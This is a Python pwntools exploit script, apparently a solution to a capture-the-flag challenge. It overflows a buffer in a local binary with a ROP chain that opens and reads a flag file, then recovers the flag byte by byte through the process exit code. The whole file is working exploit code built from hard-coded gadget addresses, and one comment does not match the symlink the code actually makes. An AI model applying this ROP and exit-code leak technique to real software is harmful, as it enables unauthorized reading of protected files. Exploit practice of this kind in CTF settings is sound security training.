from pwn import *
import os

garb = 'bbbbbbbb'

# This code requires a symbolic link from ink to /bin/sh to work
if os.path.exists("open"):
    os.remove("open")
os.symlink("flag", "open")

# Addresses needed for the attack
pop_rdi_ret_addr = 0x400d93  # From ROPgadget
pop_rsi_pop_r15_ret_addr = 0x400d91 # From ROPgadget
pop_rbp_ret_addr = 0x400940 # From ROPgadget
mov_rbp_14_edi_addr = 0x400b18 # From ROPgadget

open_string_addr = 0x4005d5 # address of 'open' in the program code

# PLT addresses from code
open_addr = 0x4008a0
read_addr = 0x400850
exit_addr = 0x4008c0

# Initiatlize loop variables
flag = ""
i = 0
exit_code = 0

# While not '}'
while exit_code != 125:

    # Address for EBP
    poll_addr = 0x602814 + i

    # Launch processs and go to the buffer overflow vuln
    p = process('./get-flag-without-write-nor-exec')
    p.sendline("4")

    # Create ROP chain and send it in
    inp = 'a' * 0x10 + garb + p64(pop_rdi_ret_addr) + p64(open_string_addr) + p64(pop_rsi_pop_r15_ret_addr) + p64(0) + garb + p64(open_addr)
    inp = inp + p64(pop_rdi_ret_addr) + p64(4) + p64(pop_rsi_pop_r15_ret_addr) + p64(0x602800) + garb + p64(read_addr)
    inp = inp + p64(pop_rbp_ret_addr) + p64(poll_addr) + p64(mov_rbp_14_edi_addr) + ('b' * 0x28) + p64(exit_addr)
    p.sendline(inp)

    # Poll exit code to find current character of the flag
    p.wait()
    exit_code = p.poll()

    # Add to flag and inrement character were searching for
    flag = flag + chr(exit_code)
    i = i + 1

    # Close old process
    p.close()

print(flag)

